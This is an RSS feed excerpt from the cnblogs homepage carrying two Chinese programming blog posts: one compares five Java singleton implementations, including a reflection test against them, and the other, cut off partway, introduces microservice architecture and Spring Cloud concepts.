<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>回字有四种写法，那你知道单例有五种写法吗 - RudeCrab</title>
<link>http://www.cnblogs.com/RudeCrab/p/14301082.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/RudeCrab/p/14301082.html</guid>
<description>&lt;p&gt;单例模式（Singleton）应该是大家接触的第一个设计模式，其写法相较于其他的设计模式来说并不复杂，核心理念也非常简单：程序从始至终只有&lt;strong&gt;同一个&lt;/strong&gt;该类的实例对象。&lt;/p&gt;
&lt;p&gt;举一个耳熟能详的例子，比如LOL中的大龙，一场游戏下来无论如何只有一只，所以该类只能被实例化一次。再举一个我们应用程序开发中常见的例子，Spring框架中的Bean作用范围默认也是单例的。&lt;/p&gt;
&lt;p&gt;我相信大家都知道单例的两种最基本的写法：饿汗式和懒汉式。但是这两种写法都有其弊端所在，除了这两种写法外其实还有几种写法。此时耳边仿佛听到孔乙己的声音：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;“对呀对呀！......回字有四样写法，你知道么？”。&lt;/p&gt;
&lt;p&gt;我愈不耐烦了，努着嘴走远。孔乙己刚用指甲蘸了酒，想在柜上写字，见我毫不热心，便又叹一口气，显出极惋惜的样子........&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;大家先别着急走，回字的四样写法没必要知道，单例的五种写法还是有必要晓得滴，其他的不说，至少面试的时候还能和面试官吹下是不，况且这几种写法也不是纯吊书袋，了解过后还是能帮助我们理解其设计思想滴。所以接下来咱们由浅入深，从最容易的写法开始，一步一步的带大家掌握单例模式！&lt;/p&gt;

&lt;h2 id=&quot;饿汉式&quot;&gt;饿汉式&lt;/h2&gt;
&lt;p&gt;话不多说，先直接上最简单的写法，然后咱再慢慢剖析：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Signleton01 {
    // 私有构造函数，防止别人实例化
    private Signleton01(){}
        // 静态属性，指向一个实例化对象
    private static final Signleton01 INSTANCE = new Signleton01();
        // 公共方法，以便别人获取到实例化对象属性
    public static Signleton01 getINSTANCE() {
        return INSTANCE;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;单例模式三元素&quot;&gt;单例模式三元素&lt;/h3&gt;
&lt;p&gt;一个单例模式就这样写完了，简直不要太简单。 类里面一共就三个元素：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;私有构造函数，防止别人实例化&lt;/li&gt;
&lt;li&gt;静态属性，指向一个实例化对象&lt;/li&gt;
&lt;li&gt;公共方法，以便别人获取到实例化对象属性&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这三个元素就是单例模式的核心，&lt;strong&gt;单例无论哪种写法，都离不开这三个元素&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这三个元素也很好理解，别人想要用我这个类的实例对象就只能通过我提供的&lt;code&gt;getINSTANCE()&lt;/code&gt;，他想new也new不了第二个对象，自然而然就保证了&lt;strong&gt;该类只有唯一对象&lt;/strong&gt;。我们可以做个试验，跑100个线程同时获取该类的实例对象，然后打印出对象的hashCode，看看到底是不是获取的同一个对象：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {
    for (int i = 0; i &amp;lt; 100; i++) {
        new Thread(() -&amp;gt; {
            System.out.println(Signleton01.getINSTANCE().hashCode());
        }).start();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;...
834649078
834649078
834649078
834649078
834649078
...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;嗯，全部都是同一个对象。&lt;/p&gt;
&lt;h3 id=&quot;优缺点&quot;&gt;优缺点&lt;/h3&gt;
&lt;p&gt;优点：写法简单，线程安全&lt;/p&gt;
&lt;p&gt;缺点：消耗资源，即使程序从没有用到过该类对象，该类也会初始化一个对象出来&lt;/p&gt;
&lt;p&gt;所以为了解决饿汗式的这个缺点， 我们就引出了第二种写法，懒汉式！&lt;/p&gt;
&lt;h2 id=&quot;懒汉式&quot;&gt;懒汉式&lt;/h2&gt;
&lt;h3 id=&quot;基本写法&quot;&gt;基本写法&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Singleton02 {
    // 私有构造函数，防止别人实例化
    private Singleton02() {}
        // 静态属性，指向一个实例化对象（注意，这里没有实例化对象哦）
    private static Singleton02 INSTANCE;
        // 公共方法，以便别人获取到实例化对象属性
    public static Singleton02 getINSTANCE() {
        if (INSTANCE == null) {
            INSTANCE = new Singleton02();
        }
        return INSTANCE;
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;懒汉式的和饿汗式最大的区别是什么呢，就是只有在调用&lt;code&gt;getINSTANCE&lt;/code&gt;的时候，才会创建实例，如果你从来没调用过，那么就不实例化对象。这个就比饿汗式更加节约资源，不过这种写法并不是懒汉式的完善写法，它有一个非常大的问题，就是线程不同步！我们可以按照之前那种方式创建100个线程测试一下结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;...
1851261656
868907500
988762476
1031371881
593800070
...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到这线程一同时拿，拿的都不是同一个对象，这完全就破坏了单例模式。因为很多线程在对象没有初始化前就进入到了&lt;code&gt;if (INSTANCE == null)&lt;/code&gt; 判断语句块里，自然而然就会new出不同的对象了。要解决这个线程不安全问题，就得上线程锁！&lt;/p&gt;
&lt;h3 id=&quot;synchronized写法&quot;&gt;synchronized写法&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Singleton02 {

    private Singleton02() {}

    private static Singleton02 INSTANCE;
    
        // 注意，这里静态方法加了synchronized关键字
    public synchronized static Singleton02 getINSTANCE() {
        if (INSTANCE == null) {
            INSTANCE = new Singleton02();
        }
        return INSTANCE;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当我们在静态方法加上&lt;code&gt;synchronized&lt;/code&gt;关键字后，就可以保证这个方法在同一时间只会有一个线程能成功调用，也就顺理成章的解决了线程不安全问题。我们还是测试一下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;...
1226880356
1226880356
1226880356
1226880356
1226880356
...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;不管多少个线程，拿到的都是同一个对象，达到了单例的要求！&lt;/p&gt;
&lt;h3 id=&quot;优缺点-1&quot;&gt;优缺点&lt;/h3&gt;
&lt;p&gt;懒汉式连基本的线程安全都不能保证，就不做讨论了，我们这里主要说的事&lt;code&gt;synchronized&lt;/code&gt;写法&lt;/p&gt;
&lt;p&gt;优点：写法简单，节约资源（只有需要该对象的时候才会实例化）&lt;/p&gt;
&lt;p&gt;缺点：耗性能&lt;/p&gt;
&lt;p&gt;要知道每一次调用&lt;code&gt;getINSTANCE()&lt;/code&gt;方法时都会上锁，这是非常耗性能的。那么为了解决这个好性能的问题，我们又引申出接下来的一种写法。&lt;/p&gt;
&lt;h2 id=&quot;双重检测&quot;&gt;双重检测&lt;/h2&gt;
&lt;p&gt;每一次调用&lt;code&gt;getINSTANCE()&lt;/code&gt;方法都会上锁，这是完全没有必要的嘛，因为只有对象还没有实例化的时候我才需要上锁以保证线程安全，对象都实例化了，自然也不用担心后续的调用会new出新的对象。 所以我们这个锁，可以加在&lt;code&gt;if (INSTANCE == null)&lt;/code&gt; 判断语句块里面：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Singleton03 {
    private Singleton03() {}

    private static Singleton03 INSTANCE;

    public static Singleton03 getINSTANCE() {
        if (INSTANCE == null) {
            // 只有在对象还没有实例化的时候才上锁
            synchronized (Singleton03.class) {
                INSTANCE = new Singleton03();
            }
        }
        return INSTANCE;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样就能节约一些性能，但是这样并没有做到线程安全哦！ 因为很多线程进入到&lt;code&gt;if (INSTANCE == null)&lt;/code&gt; 判断语句后，虽说是因为锁不能同时new对象了，但是如果锁一旦释放，那么其他线程依然会执行到&lt;code&gt;INSTANCE = new Singleton03()&lt;/code&gt;语句，从而破坏了单例。所以在&lt;code&gt;synchronized&lt;/code&gt;代码块内还要加一层判断：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Singleton03 {
    private Singleton03() {}
        
    // 注意，使用双重检验写法要加上volatile关键字，避免指令重排（有个印象就行，这不是本文的重点）
    private static volatile Singleton03 INSTANCE;

    public static Singleton03 getINSTANCE() {
        if (INSTANCE == null) {
            // 只有在对象还没有实例化的时候才上锁
            synchronized (Singleton03.class) {
                // 额外加一层判断
                if (INSTANCE == null) {
                        INSTANCE = new Singleton03();
                }
            }
        }
        return INSTANCE;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;synchronized&lt;/code&gt;代码块外面一层判断，里面一层判断，就是有名的双重检测（DCL）了！里面的这一层判断加了之后呢，第一个线程的锁一旦释放也不用担心了，因为此时对象已经实例化，后续的线程也执行不了new语句，从而保证了线程安全！&lt;/p&gt;
&lt;h3 id=&quot;优缺点-2&quot;&gt;优缺点&lt;/h3&gt;
&lt;p&gt;优点：节约资源（只有需要该对象的时候才会实例化）&lt;/p&gt;
&lt;p&gt;缺点：写法复杂，耗性能（还是上了锁，还是耗性能）&lt;/p&gt;
&lt;p&gt;虽然双重校验比&lt;code&gt;synchronized&lt;/code&gt;懒汉式写法减少了很多锁性能消耗，但毕竟还是上了锁，所以为了解决这个锁性能消耗问题了，又引申出下一种写法。&lt;/p&gt;
&lt;h2 id=&quot;内部类&quot;&gt;内部类&lt;/h2&gt;
&lt;p&gt;话不多说，直接上代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Singleton04 {
    // 老套路，将构造函数私有化
    private Singleton04() {}
        // 声明一个内部类，内部类里持有实例的引用
    private static class Inner {
        public static final Singleton04 INSTANCE = new Singleton04();
    }
        // 公共方法
    public static Singleton04 getINSTANCE() {
        return Inner.INSTANCE;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个写法非常像饿汉式写法，单例三元素还是那三元素，只不过多加了一个内部类，将实例引用放到内部类里而已。为啥要这样写呢？因为JVM保证了内部类的线程安全，即一个内部类在整个程序中不会被重复加载，并且如果你没有使用到内部类的话，是不会加载这个内部类的。这就非常巧妙的实现了线程安全以及节约资源的好处！&lt;/p&gt;
&lt;h3 id=&quot;优缺点-3&quot;&gt;优缺点&lt;/h3&gt;
&lt;p&gt;优点：写法简单、节约资源（只有调用了&lt;code&gt;getINSTANCE()&lt;/code&gt;方法才会加载内部类，才会实例化对象）、线程安全（JVM保证了内部类的线程安全）&lt;/p&gt;
&lt;p&gt;缺点：会被序列化或者反射破坏单例&lt;/p&gt;
&lt;p&gt;这个缺点可以说是&lt;strong&gt;吹毛求疵&lt;/strong&gt;，因为之前所有写法都会被序列化、反射破坏单例。虽然说是吹毛求疵，但咱们搞技术的还是得做到了解全部细节，我来演示一下怎样破坏这个单例&lt;/p&gt;
&lt;h3 id=&quot;通过反射破坏单例&quot;&gt;通过反射破坏单例&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) throws Exception {
    // 创建100个线程同时访问实例
    for (int i = 0; i &amp;lt; 100; i++) {
        new Thread(() -&amp;gt; {
            System.out.println(Singleton04.getINSTANCE().hashCode());
        }).start();
    }

    // 反射破坏单例
    Class&amp;lt;Singleton04&amp;gt; clazz = Singleton04.class;
    // 拿到无参构造函数并将其设置为可访问，无视private
    Constructor&amp;lt;Singleton04&amp;gt; constructor = clazz.getDeclaredConstructor();
    constructor.setAccessible(true);
    // 创建对象
    Singleton04 singleton04 = constructor.newInstance();
    System.out.println(&quot;反射：&quot; + singleton04.hashCode());
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行结果如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;...
2115147268
2115147268
反射：1078694789
2115147268
2115147268
...
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果是通过正常的访问实例方法，是完全可以做到单例的要求，但是如果用反射的形式来创建一个对象，则就破坏了单例，一个程序中就出现了多个不同的实例对象。那么为了解决这个吹毛求疵的问题，聪明的前辈们想到了一个完美的写法！&lt;/p&gt;
&lt;h2 id=&quot;枚举&quot;&gt;枚举&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 注意，这里是枚举
public enum Singleton05 {
    // 实例
    INSTANCE;
        // 公共方法
    public static Singleton05 getINSTANCE() {
        return INSTANCE;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;哎嘿，不是说所有单例都是那三元素吗，这里怎么只有两个元素呀！这是因为枚举就没有构造方法，自然而然就做到了私有化构造函数的效果，而且比私有化构造函数效果更好！因为都没有构造函数了，连序列化和反射都破坏不了这种写法的单例！！&lt;/p&gt;
&lt;p&gt;眼见为实，我们做个试验：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) throws Exception {
    // 创建100个线程同时访问实例
    for (int i = 0; i &amp;lt; 100; i++) {
        new Thread(() -&amp;gt; {
            System.out.println(Singleton05.getINSTANCE().hashCode());
        }).start();
    }

    // 反射破坏单例
    Class&amp;lt;Singleton05&amp;gt; clazz = Singleton05.class;
    // 拿到无参构造函数并将其设置为可访问，无视private
    Constructor&amp;lt;Singleton05&amp;gt; constructor = clazz.getDeclaredConstructor();
    constructor.setAccessible(true);
    // 创建对象
    Singleton05 singleton05 = constructor.newInstance();
    System.out.println(&quot;反射：&quot; + singleton05.hashCode());
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行结果如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;...
422057313
422057313
422057313
422057313

Exception in thread &quot;main&quot; java.lang.NoSuchMethodException: Singleton05.&amp;lt;init&amp;gt;()
        at java.lang.Class.getConstructor0(Class.java:3082)
        at java.lang.Class.getDeclaredConstructor(Class.java:2178)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当运行到反射那一块代码的时候，程序直接报错，原因就是我之前所说的一样，枚举没有构造方法，你自然就无法通过反射来创建对象了！&lt;/p&gt;
&lt;h3 id=&quot;优缺点-4&quot;&gt;优缺点&lt;/h3&gt;
&lt;p&gt;此方法乃是最完美的方法，真是佩服想出这种写法的前辈！&lt;/p&gt;

&lt;p&gt;五个写法全部介绍完毕，每个写法都有其特点，根据自己的需求来写就好了！每种写法理解其特点后，写出来也就非常轻松。就像我一开始说的一样，理解这五种写法也不是吊书袋，每一种写法都有其背后的思考，有些写法思路真的让人叹服，至少我了解到内部类和枚举写法的时候我心里就是：我靠！这都能想出来，太牛逼了吧......&lt;/p&gt;
&lt;p&gt;好的代码就是艺术作品，希望我们都能码出好的艺术出来！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1496775/202101/1496775-20210108125800650-1747993399.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 20 Jan 2021 00:48:00 +0000</pubDate>
<dc:creator>RudeCrab</dc:creator>
<og:description>基本介绍 单例模式（Singleton）应该是大家接触的第一个设计模式，其写法相较于其他的设计模式来说并不复杂，核心理念也非常简单：程序从始至终只有同一个该类的实例对象。 举一个耳熟能详的例子，比如L</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/RudeCrab/p/14301082.html</dc:identifier>
</item>
<item>
<title>一. SpringCloud简介与微服务架构 - MPolaris</title>
<link>http://www.cnblogs.com/mpolaris/p/14300886.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mpolaris/p/14300886.html</guid>
<description>&lt;h4 id=&quot;1--微服务架构&quot;&gt;1. 微服务架构&lt;/h4&gt;
&lt;h5 id=&quot;11-微服务架构理解&quot;&gt;1.1 微服务架构理解&lt;/h5&gt;
&lt;p&gt;微服务架构（Microservice Architecture）是一种架构概念，旨在通过将功能分解到各个离散的服务中以实现对解决方案的解耦。你可以将其看作是在架构层次而非获取服务的类上应用很多SOLID原则。微服务架构是个很有趣的概念，它的主要作用是将功能分解到离散的各个服务当中，从而降低系统的耦合性，并提供更加灵活的服务支持。&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;code&gt;概念&lt;/code&gt;：把一个大型的单个应用程序和服务拆分为数个甚至数十个的支持微服务，它可扩展单个组件而不是整个的应用程序堆栈，从而满足服务等级协议。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;code&gt;定义&lt;/code&gt;：围绕业务领域组件来创建应用，这些应用可独立地进行开发、管理和迭代。在分散的组件中使用云架构和平台式部署、管理和服务功能，使产品交付变得更加简单。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;code&gt;本质&lt;/code&gt;：用一些功能比较明确、业务比较精练的服务去解决更大、更实际的问题。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;12-传统开发模式和微服务的区别&quot;&gt;1.2 传统开发模式和微服务的区别&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;传统的web开发方式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过对比比较容易理解什么是Microservice Architecture。和Microservice相对应的，这种方式一般被称为Monolithic（单体式开发）。所有的功能打包在一个 WAR包里，基本没有外部依赖（除了容器），部署在一个JEE容器（Tomcat，JBoss，WebLogic）里，包含了 DO/DAO，Service，UI等所有逻辑。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210119231900.png&quot; alt=&quot;image-20210119231859856&quot;/&gt;&lt;p&gt;优点：&lt;/p&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ul readability=&quot;2&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;效率低：开发都在同一个项目改代码，相互等待，冲突不断&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;维护难：代码功功能耦合在一起，新人不知道何从下手&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;不灵活：构建时间长，任何小修改都要重构整个项目，耗时&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;稳定性差：一个微小的问题，都可能导致整个应用挂掉&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;扩展性不够：无法满足高并发下的业务需求&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;常见的系统架构遵循的三个标准和业务驱动力：&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;提高敏捷性：及时响应业务需求，促进企业发展&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;提升用户体验：提升用户体验，减少用户流失&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;降低成本：降低增加产品，客户或业务方案的成本&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;基于微服务架构的设计&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;目的：有效的拆分应用，实现敏捷开发和部署&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120001550.png&quot; alt=&quot;image-20210120001550433&quot;/&gt;&lt;p&gt;关于微服务的一个形象表达&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;X轴：运行多个负载均衡器之后的运行实例&lt;/li&gt;
&lt;li&gt;Y轴：将应用进一步分解为微服务（分库）&lt;/li&gt;
&lt;li&gt;Z轴：大数据量时，将服务分区（分表）&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210119232839.png&quot; alt=&quot;image-20210119232839426&quot;/&gt;&lt;h5 id=&quot;13-微服务的具体特征&quot;&gt;1.3 微服务的具体特征&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;官方定义&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;一些列的独立的服务共同组成系统&lt;/li&gt;
&lt;li&gt;单独部署，跑在自己的进程中&lt;/li&gt;
&lt;li&gt;每个服务为独立的业务开发&lt;/li&gt;
&lt;li&gt;分布式管理&lt;/li&gt;
&lt;li&gt;非常强调隔离性&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;大概的标准&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;分布式服务组成的系统&lt;/li&gt;
&lt;li&gt;按照业务，而不是技术来划分组织&lt;/li&gt;
&lt;li&gt;做有生命的产品而不是项目&lt;/li&gt;
&lt;li&gt;强服务个体和弱通信（ Smart endpoints and dumb pipes ）&lt;/li&gt;
&lt;li&gt;自动化运维（ DevOps ）&lt;/li&gt;
&lt;li&gt;高度容错性&lt;/li&gt;
&lt;li&gt;快速演化和迭代&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;14-怎么具体实践微服务&quot;&gt;1.4 怎么具体实践微服务&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;客户端如何访问这些服务 - API Gateway&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;原来的单体开发，所有的服务都是本地的，UI可以直接调用，现在按功能拆分成独立的服务，跑在独立的一般都在独立的虚拟机上的 Java进程了。客户端UI如何访问他的？后台有N个服务，前台就需要记住管理N个服务，一个服务下线/更新/升级，前台就要重新部署，这明显不符合我们拆分的理念，特别当前台是移动应用的时候，通常业务变化的节奏更快。另外，N个小服务的调用也是一个不小的网络开销。还有一般微服务在系统内部，通常是无状态的，用户登录信息和权限管理最好有一个统一的地方维护管理（OAuth）。&lt;/p&gt;
&lt;p&gt;所以一般在后台N个服务和UI之间一般会一个代理或者叫 &lt;code&gt;API Gateway&lt;/code&gt;，他的作用包括：&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;提供统一服务入口，让微服务对前台透明&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;聚合后台的服务，节省流量，提升性能&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;提供安全，过滤，流控等API管理功能&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;其实这个API Gateway可以有很多广义的实现办法，可以是一个软硬一体的盒子，也可以是一个简单的MVC框架，甚至是一个Node.js的服务端。他们最重要的作 用是为前台（通常是移动应用）提供后台服务的聚合，提供一个统一的服务出口，解除他们之间的耦合，不过API Gateway也有可能成为单点故障点或者性能的瓶颈。用过Taobao Open Platform（淘宝开放平台）的就能很容易的体会，TAO就是这个API Gateway。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120001423.png&quot; alt=&quot;image-20210120001423689&quot;/&gt;&lt;p&gt;&lt;strong&gt;每个服务之间如何通信 - IPC&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;所有的微服务都是独立的Java进程跑在独立的虚拟机上，所以服务间的通信就是IPC（inter process communication），已经有很多成熟的方案。现在基本最通用的有两种方式：&lt;/p&gt;
&lt;p&gt;同步调用：① REST（JAX-RS，Spring Boot）② RPC（Thrift, Dubbo）&lt;/p&gt;
&lt;p&gt;异步消息调用：(Kafka, Notify, MetaQ)&lt;/p&gt;
&lt;blockquote readability=&quot;15&quot;&gt;
&lt;p&gt;&lt;strong&gt;同步和异步的区别：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一般同步调用比较简单，一致性强，但是容易出调用问题，性能体验上也会差些，特别是调用层次多的时候。RESTful和RPC的比较也是一个很有意思的话题。一般REST基于HTTP，更容易实现，更容易被接受，服务端实现技术也更灵活些，各个语言都能支持，同时能跨客户端，对客户端没有特殊的要求，只要封装了HTTP的SDK就能调用，所以相对使用的广一些。RPC也有自己的优点，传输协议更高效，安全更可控，特别在一个公司内部，如果有统一个的开发规范和统一的服务框架时，他的开发效率优势更明显些。就看各自的技术积累实际条件自己的选择了。&lt;/p&gt;
&lt;p&gt;而异步消息的方式在分布式系统中有特别广泛的应用，他既能减低调用服务之间的耦合，又能成为调用之间的缓冲，确保消息积压不会冲垮被调用方，同时能保证调用方的服务体验，继续干自己该干的活，不至于被后台性能拖慢。不过需要付出的代价是一致性的减弱，需要接受数据最终一致性；还有就是后台服务一般要 实现幂等性，因为消息发送出于性能的考虑一般会有重复（保证消息的被收到且仅收到一次对性能是很大的考验）；最后就是必须引入一个独立的broker，如果公司内部没有技术积累，对broker分布式管理也是一个很大的挑战。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120001259.png&quot; alt=&quot;image-20210120001259264&quot;/&gt;&lt;p&gt;&lt;strong&gt;如此多的服务如何实现？- 服务发现&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在微服务架构中，一般每一个服务都是有多个拷贝来做负载均衡。一个服务随时可能下线也可能应对临时访问压力增加新的服务节点。服务之间如何相互感知？服务如何管理？这就是服务发现的问题了。一般有两类做法，也各有优缺点。基本都是通过zookeeper等类似技术做服务注册信息的分布式管理。当服务上线时，服务提供者将自己的服务信息注册到ZK（或类似框架），并通过心跳维持长链接，实时更新链接信息。服务调用者通过ZK寻址，根据可定制算法找到一个服务，还可以将服务信息缓存在本地以提高性能。当服务下线时，ZK会发通知给服务客户端。&lt;/p&gt;
&lt;p&gt;客户端做服务发现：优点是架构简单，扩展灵活，只对服务注册器依赖。缺点是客户端要维护所有调用服务的地址有技术难度，一般大公司都有成熟的内部框架支持，比如Dubbo。&lt;/p&gt;
&lt;p&gt;服务端做服务发现：优点是简单，所有服务对于前台调用方透明，一般在小公司在云服务上部署的应用采用的比较多。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120000344.png&quot; alt=&quot;image-20210120000344555&quot;/&gt;&lt;p&gt;&lt;strong&gt;服务挂了如何解决 - 熔断机制，限流，负载均衡...&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前面提到，Monolithic方式开发一个很大的风险是把所有鸡蛋放在一个篮子里，一荣俱荣一损俱损。而分布式最大的特性就是网络是不可靠的。通过微服务拆分能降低这个风险，不过如果没有特别的保障结局肯定是噩梦。所以当我们的系统是由一系列的服务调用链组成的时候，我们必须确保任一环节出问题都不至于影响整体链路。&lt;/p&gt;
&lt;p&gt;相应的手段有很多：这些方法基本都很明确通用，比如Netflix的Hystrix：&lt;a href=&quot;https://github.com/Netflix/Hystrix&quot; target=&quot;_blank&quot;&gt;https://github.com/Netflix/Hystrix&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;重试机制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;限流&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;熔断机制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;负载均衡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;降级（本地缓存）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/SpringCloud/20210120001009.png&quot; alt=&quot;image-20210120001009915&quot;/&gt;&lt;h5 id=&quot;15-微服务的优缺点&quot;&gt;1.5 微服务的优缺点&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;微服务的优点：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
